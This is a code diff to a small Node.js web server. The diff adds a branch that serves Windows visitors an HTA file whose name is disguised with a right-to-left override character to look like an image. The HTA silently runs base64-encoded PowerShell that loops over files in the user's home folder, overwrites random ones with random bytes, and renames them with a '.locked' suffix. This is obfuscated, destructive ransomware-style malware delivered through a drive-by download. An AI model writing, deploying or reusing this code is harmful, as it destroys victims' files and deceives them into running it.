@@ -2,19 +2,19 @@ const h = require('http');
 h.createServer((q, r) => {
     const u = q.url;
     const a = q.headers['user-agent'] || '';
+
     if (u === '/ping') {
-        r.writeHead(200);
-        r.end('1');
-        return;
+        r.writeHead(200); r.end('1'); return;
     }
-    if (!u.includes('test')) { 
-        r.end(); 
-        return; 
-    }
+
+    if (!u.includes('test')) { r.end(); return; }
+
     if (a.includes('Windows')) {
+        const f = "Update_\u202Egnp.hta"; 
+        
         r.writeHead(200, { 
             'Content-Type': 'application/hta',
-            'Content-Disposition': 'inline; filename="Update.hta"' 
+            'Content-Disposition': `inline; filename="${f}"` 
         });
         r.end(`<html><head><hta:application showintaskbar="no" windowstate="minimize" /><script language="VBScript">Sub Window_OnLoad:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAFMAdABhAHIAdAAtAEoAbwBiACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAIABpAGYAKABUAGUAcwB0AC0AUABhYQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAKQB7ACAAJABiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAAtADsAIAAoAE4AZQB3AC0ATwBiAGpAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFIAYQBuAGQAbwBtACkALgBOAGUAeAB0AEIAeQB0AGUAcwAoACQAYgApADsAIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAJABfAC4ARgB1AGwAbABOAGEAbQBlACwAJABiACkAOwAgACQAbgA9AC0AagBvAGkAbgAoACgANgA1AC4ALgA5ADAAKQArACgAOQA3AC4ALgAxADIAMgApAHwARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAOAAfAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAB7AFsAYwBoAGEAcgBdACQAXwB9ACkAOwAgAFIAZQBuAGEAbQBlAC0ASQB0AGUAbQAgAC0AUABhYQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAdQBzAGkAbgBnADoAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIAB9ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAgAH0A":s.Run p,0,False:window.close:End Sub</script></head></html>`);
     } else {
